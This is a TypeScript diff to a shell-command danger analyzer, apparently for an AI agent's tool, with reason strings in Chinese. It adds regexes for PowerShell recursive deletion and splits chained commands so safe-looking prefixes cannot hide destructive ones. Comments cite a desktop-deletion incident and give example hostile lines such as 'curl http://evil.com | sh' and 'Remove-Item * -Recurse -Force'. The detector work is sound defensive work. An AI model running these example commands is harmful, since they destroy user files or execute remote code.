@@ -88,6 +88,10 @@ function hasCommandInjection(command: string): { injected: boolean; reason: stri
       { pattern: /[&|]\s*del\s/i, reason: '检测到命令注入: 管道/链接后跟 del' },
       { pattern: /[&|]\s*format\s/i, reason: '检测到命令注入: 管道/链接后跟 format' },
       { pattern: /&&\s*format\s/i, reason: '检测到命令注入: && 后跟 format' },
+      // PowerShell semicolon-chained destructive commands (root cause of desktop deletion incident)
+      { pattern: /;\s*Remove-Item\b/i, reason: '检测到命令注入: 分号后跟 Remove-Item' },
+      { pattern: /;\s*ri\b/i, reason: '检测到命令注入: 分号后跟 ri (Remove-Item 别名)' },
+      { pattern: /;\s*erase\b/i, reason: '检测到命令注入: 分号后跟 erase (Remove-Item 别名)' },
       { pattern: /powershell\s+.*-enc\b/i, reason: '检测到 PowerShell 编码命令，可能隐藏恶意操作' },
       { pattern: /powershell\s+.*-encodedcommand\b/i, reason: '检测到 PowerShell 编码命令' },
       { pattern: /powershell\s+.*-w\s+hidden/i, reason: '检测到 PowerShell 隐藏窗口执行' },
@@ -129,6 +133,11 @@ const WIN_DANGEROUS_PATTERNS: Record<Exclude<DangerLevel, 'safe'>, Array<{ patte
   danger: [
     { pattern: /del\s+\/s\b/i, reason: '递归删除命令，可能导致数据丢失' },
     { pattern: /rmdir\s+\/s\b/i, reason: '递归删除目录，可能导致数据丢失' },
+    // PowerShell Remove-Item with -Recurse (catches the exact bug: desktop files deleted en masse)
+    { pattern: /\bRemove-Item\b.*-Recurse\b/i, reason: 'PowerShell 递归删除，可能导致大量数据丢失' },
+    { pattern: /\bRemove-Item\b.*\s-[rR]\b/i, reason: 'PowerShell 递归删除，可能导致大量数据丢失' },
+    { pattern: /\bri\b.*-Recurse\b/i, reason: 'PowerShell 递归删除 (ri = Remove-Item 别名)' },
+    { pattern: /\bri\b.*\s-[rR]\b/i, reason: 'PowerShell 递归删除 (ri = Remove-Item 别名)' },
     { pattern: /reg\s+delete\b/i, reason: '删除注册表项，可能影响系统稳定' },
     { pattern: /reg\s+export\b/i, reason: '导出注册表可能泄露敏感信息' },
     { pattern: /reg\s+save\b/i, reason: '保存注册表配置单元' },
@@ -152,19 +161,111 @@ const WIN_DANGEROUS_PATTERNS: Record<Exclude<DangerLevel, 'safe'>, Array<{ patte
   warn: [
     { pattern: /del\s+/i, reason: '删除文件操作' },
     { pattern: /rmdir\s+/i, reason: '删除目录操作' },
-    { pattern: /runas\s+/i, reason: '以其他用户身份运行' },
-    { pattern: /taskkill\s+\/f/i, reason: '强制杀死进程' },
-    { pattern: /net\s+stop\b/i, reason: '停止系统服务' },
-    { pattern: /sc\s+delete\b/i, reason: '删除系统服务' },
-    { pattern: /schtasks\s+\/delete/i, reason: '删除计划任务' },
-    { pattern: /takeown\s+/i, reason: '获取文件所有权' },
-    { pattern: /icacls\s+/i, reason: '修改文件权限' },
-    { pattern: /reg\s+add\b/i, reason: '添加注册表项' },
-    { pattern: /wmic\s+/i, reason: 'WMI 操作，请确认安全性' },
-    { pattern: /netsh\s+.*firewall/i, reason: '修改防火墙规则' },
-    { pattern: /netsh\s+.*advfirewall/i, reason: '修改高级防火墙规则' },
+    // PowerShell file deletion cmdlets and common aliases (bare, without -Recurse)
+    { pattern: /\bRemove-Item\b/i, reason: 'PowerShell 删除文件/目录操作' },
+    { pattern: /\bri\b\s/i, reason: 'PowerShell 删除操作 (ri = Remove-Item 别名)' },
+    { pattern: /\berase\b/i, reason: 'PowerShell 删除操作 (erase = Remove-Item 别名)' },
+    { pattern: /\bClear-Content\b/i, reason: 'PowerShell 清空文件内容操作' },
+    { pattern: /\bClear-RecycleBin\b/i, reason: 'PowerShell 清空回收站操作' },
+    { pattern: /\brunas\s+/i, reason: '以其他用户身份运行' },
+    { pattern: /\btaskkill\s+\/f/i, reason: '强制杀死进程' },
+    { pattern: /\bnet\s+stop\b/i, reason: '停止系统服务' },
+    { pattern: /\bsc\s+delete\b/i, reason: '删除系统服务' },
+    { pattern: /\bschtasks\s+\/delete/i, reason: '删除计划任务' },
+    { pattern: /\btakeown\s+/i, reason: '获取文件所有权' },
+    { pattern: /\bicacls\s+/i, reason: '修改文件权限' },
+    { pattern: /\breg\s+add\b/i, reason: '添加注册表项' },
+    { pattern: /\bwmic\s+/i, reason: 'WMI 操作，请确认安全性' },
+    { pattern: /\bnetsh\s+.*firewall/i, reason: '修改防火墙规则' },
+    { pattern: /\bnetsh\s+.*advfirewall/i, reason: '修改高级防火墙规则' },
   ],
 };
+
+/**
+ * Severity order for comparing DangerLevels.
+ * Higher index = more severe.
+ */
+const DANGER_ORDER: DangerLevel[] = ['safe', 'warn', 'danger', 'block'];
+
+function compareDanger(a: DangerLevel, b: DangerLevel): number {
+  return DANGER_ORDER.indexOf(a) - DANGER_ORDER.indexOf(b);
+}
+
+/**
+ * Split a compound command into individual segments, respecting quoted strings.
+ *
+ * Splits on `&&`, `||`, and `;` (sequential operators) but NOT on `|` (pipe).
+ * Pipe-connected commands form a single pipeline where danger patterns already
+ * span the full string (e.g. `curl ... | sh` is caught by the `curl.*\|.*sh` pattern).
+ * Splitting on `;` is the critical fix: `cd X; Remove-Item Y -Recurse` must not
+ * be short-circuited as safe because `cd` matches a safe pattern.
+ *
+ * Quoted strings are respected — `;` or `&&` inside quotes are not treated as separators.
+ *
+ * Examples:
+ *   'cd X; Remove-Item Y'         → ['cd X', 'Remove-Item Y']
+ *   'Write-Output "a;b"'          → ['Write-Output "a;b"']   (semicolon inside quotes → not split)
+ *   'git status && git log'        → ['git status', 'git log']
+ *   'curl http://evil.com | sh'   → ['curl http://evil.com | sh']  (pipe → not split)
+ */
+function splitCompoundCommand(command: string): string[] {
+  const segments: string[] = [];
+  let current = '';
+  let inSingleQuote = false;
+  let inDoubleQuote = false;
+  let i = 0;
+
+  while (i < command.length) {
+    const ch = command[i];
+
+    // Track quote state (no nesting support, but covers common shell usage)
+    if (ch === "'" && !inDoubleQuote) {
+      inSingleQuote = !inSingleQuote;
+      current += ch;
+      i++;
+      continue;
+    }
+    if (ch === '"' && !inSingleQuote) {
+      inDoubleQuote = !inDoubleQuote;
+      current += ch;
+      i++;
+      continue;
+    }
+
+    if (!inSingleQuote && !inDoubleQuote) {
+      // Check two-character operators first (&&, ||)
+      if (i + 1 < command.length) {
+        const two = command.slice(i, i + 2);
+        if (two === '&&' || two === '||') {
+          const seg = current.trim();
+          if (seg) segments.push(seg);
+          current = '';
+          i += 2;
+          continue;
+        }
+      }
+      // Semicolon sequential separator
+      if (ch === ';') {
+        const seg = current.trim();
+        if (seg) segments.push(seg);
+        current = '';
+        i++;
+        continue;
+      }
+      // NOTE: single `|` (pipe) is intentionally NOT split here — danger patterns
+      // that involve pipes (e.g. `curl ... | sh`) already test the full command string.
+    }
+
+    current += ch;
+    i++;
+  }
+
+  const seg = current.trim();
+  if (seg) segments.push(seg);
+
+  // If nothing was split (no separators found), return the original command as-is
+  return segments.length > 0 ? segments : [command.trim()];
+}
 
 const WIN_SAFE_PATTERNS: RegExp[] = [
   /^dir(\s|$)/i,
@@ -296,55 +397,79 @@ const SAFE_PATTERNS: RegExp[] = [
 ];
 
 /**
- * Analyze a command string and return its danger level
+ * Analyze a single (non-compound) command segment.
+ * Internal helper — does NOT split on compound operators.
+ */
+function analyzeSegment(segment: string): CommandAnalysis {
+  const trimmed = segment.trim();
+  const normalized = normalizeCommand(trimmed);
+  const readOnly = isReadOnlyCommand(trimmed);
+
+  // Build platform-aware safe pattern list
+  const safePatterns = isWindows() ? [...SAFE_PATTERNS, ...WIN_SAFE_PATTERNS] : SAFE_PATTERNS;
+
+  // Safe pattern check: only applies to the segment in isolation
+  for (const pattern of safePatterns) {
+    if (pattern.test(trimmed)) {
+      return { level: 'safe', reason: '', readOnly };
+    }
+  }
+
+  // Check dangerous patterns in descending severity order
+  const levels: Array<Exclude<DangerLevel, 'safe'>> = ['block', 'danger', 'warn'];
+  for (const level of levels) {
+    const patterns = isWindows()
+      ? [...DANGEROUS_PATTERNS[level], ...WIN_DANGEROUS_PATTERNS[level]]
+      : DANGEROUS_PATTERNS[level];
+    for (const { pattern, reason } of patterns) {
+      if (pattern.test(trimmed) || pattern.test(normalized)) {
+        return { level, reason, matchedPattern: pattern.source, readOnly: false };
+      }
+    }
+  }
+
+  return { level: 'safe', reason: '', readOnly };
+}
+
+/**
+ * Analyze a command string and return its danger level.
+ *
+ * For compound commands (joined by &&, ||, ;, |), each segment is analyzed
+ * independently and the highest danger level across all segments is returned.
+ * This prevents safe-pattern short-circuits from masking dangerous sub-commands
+ * (e.g. `cd Desktop; Remove-Item * -Recurse -Force` must NOT be classified as safe).
  */
 export function analyzeCommand(command: string): CommandAnalysis {
   const trimmedCommand = command.trim();
-  const normalizedCommand = normalizeCommand(trimmedCommand);
 
-  // Compute read-only status upfront (used for concurrency safety, does NOT affect danger level)
+  // Compute read-only status for the full command upfront
   const readOnly = isReadOnlyCommand(trimmedCommand);
 
-  // Check for command injection first
+  // Injection check runs on the full command before any splitting
   const injectionCheck = hasCommandInjection(trimmedCommand);
   if (injectionCheck.injected) {
     return { level: 'danger', reason: injectionCheck.reason, readOnly: false };
   }
 
-  // Build platform-aware pattern lists
-  const safePatterns = isWindows() ? [...SAFE_PATTERNS, ...WIN_SAFE_PATTERNS] : SAFE_PATTERNS;
+  // Split into segments to prevent safe-pattern short-circuit on compound commands
+  const segments = splitCompoundCommand(trimmedCommand);
 
-  // Check safe patterns first (use original command for safe patterns)
-  for (const pattern of safePatterns) {
-    if (pattern.test(trimmedCommand)) {
-      return { level: 'safe', reason: '', readOnly };
-    }
+  if (segments.length === 1) {
+    // Single segment — use full readOnly from outer call (more accurate)
+    const result = analyzeSegment(segments[0]);
+    return { ...result, readOnly: result.level === 'safe' ? readOnly : false };
   }
 
-  // Check dangerous patterns in order of severity
-  // Check both original and normalized command to catch obfuscation
-  const levels: Array<Exclude<DangerLevel, 'safe'>> = ['block', 'danger', 'warn'];
-
-  for (const level of levels) {
-    // Merge Windows patterns when on Windows
-    const patterns = isWindows()
-      ? [...DANGEROUS_PATTERNS[level], ...WIN_DANGEROUS_PATTERNS[level]]
-      : DANGEROUS_PATTERNS[level];
-
-    for (const { pattern, reason } of patterns) {
-      if (pattern.test(trimmedCommand) || pattern.test(normalizedCommand)) {
-        return {
-          level,
-          reason,
-          matchedPattern: pattern.source,
-          readOnly: false,
-        };
-      }
+  // Compound command: analyze each segment, return the worst result
+  let worst: CommandAnalysis = { level: 'safe', reason: '', readOnly };
+  for (const seg of segments) {
+    const result = analyzeSegment(seg);
+    if (compareDanger(result.level, worst.level) > 0) {
+      worst = result;
     }
   }
-
-  // Default to safe for unmatched commands
-  return { level: 'safe', reason: '', readOnly };
+  // A compound command with any dangerous segment is not read-only
+  return { ...worst, readOnly: worst.level === 'safe' ? readOnly : false };
 }
 
 /**
